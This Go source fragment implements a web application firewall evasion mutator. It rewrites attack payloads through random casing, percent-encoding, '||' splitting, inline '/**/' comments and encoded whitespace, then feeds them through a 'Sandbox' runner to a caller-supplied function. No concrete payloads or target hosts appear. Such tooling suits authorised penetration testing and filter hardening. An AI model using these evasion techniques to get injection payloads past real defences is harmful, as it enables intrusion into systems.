type WAFMutator struct {
	techniques []string
	rng        *rand.Rand
}

func NewWAFMutator() *WAFMutator {
	return &WAFMutator{
		techniques: []string{"case", "encoding", "concat", "comment", "whitespace"},
		rng:        rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (m *WAFMutator) Mutate(payload string) []string {
	var variants []string

	variants = append(variants, payload)
	variants = append(variants, mutateCase(payload))
	variants = append(variants, mutateEncoding(payload))
	variants = append(variants, mutateConcat(payload))
	variants = append(variants, mutateComment(payload))
	variants = append(variants, mutateWhitespace(payload))

	return variants
}

func (m *WAFMutator) MutateBatch(payloads []string) map[string][]string {
	result := make(map[string][]string)
	for _, p := range payloads {
		result[p] = m.Mutate(p)
	}
	return result
}

func mutateCase(payload string) string {
	var sb strings.Builder
	for _, c := range payload {
		if c >= 'a' && c <= 'z' {
			if rand.Intn(2) == 0 {
				sb.WriteByte(byte(c - 32))
			} else {
				sb.WriteByte(byte(c))
			}
		} else {
			sb.WriteByte(byte(c))
		}
	}
	return sb.String()
}

func mutateEncoding(payload string) string {
	var sb strings.Builder
	for _, c := range payload {
		sb.WriteString(fmt.Sprintf("%%%02x", c))
	}
	return sb.String()
}

func mutateConcat(payload string) string {
	if len(payload) < 4 {
		return payload
	}
	mid := len(payload) / 2
	return fmt.Sprintf("%s||%s", payload[:mid], payload[mid:])
}

func mutateComment(payload string) string {
	var sb strings.Builder
	for i, c := range payload {
		sb.WriteRune(c)
		if i < len(payload)-1 && rand.Intn(3) == 0 {
			sb.WriteString("/**/")
		}
	}
	return sb.String()
}

func mutateWhitespace(payload string) string {
	ws := []string{" ", "\t", "\n", "\r", "%09", "%0a", "%0d", "/**/"}
	var sb strings.Builder
	for i, c := range payload {
		if c == ' ' {
			sb.WriteString(ws[rand.Intn(len(ws))])
		} else {
			sb.WriteRune(c)
		}
		_ = i
	}
	return sb.String()
}

type Sandbox struct {
	payloads []string
	mu       sync.Mutex
}

func NewSandbox() *Sandbox {
	return &Sandbox{payloads: make([]string, 0)}
}

func (s *Sandbox) Load(payload string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.payloads = append(s.payloads, payload)
}

func (s *Sandbox) Execute(ctx context.Context, fn func(payload string) (string, error)) []SandboxResult {
	s.mu.Lock()
	items := make([]string, len(s.payloads))
	copy(items, s.payloads)
	s.payloads = s.payloads[:0]
	s.mu.Unlock()

	var results []SandboxResult
	for _, p := range items {
		select {
		case <-ctx.Done():
			results = append(results, SandboxResult{Payload: p, Error: ctx.Err().Error()})
			continue
		default:
		}
		output, err := fn(p)
		results = append(results, SandboxResult{Payload: p, Output: output, Error: errToString(err)})
	}
	return results
}

type SandboxResult struct {
	Payload string
	Output  string
	Error   string
}

func errToString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}
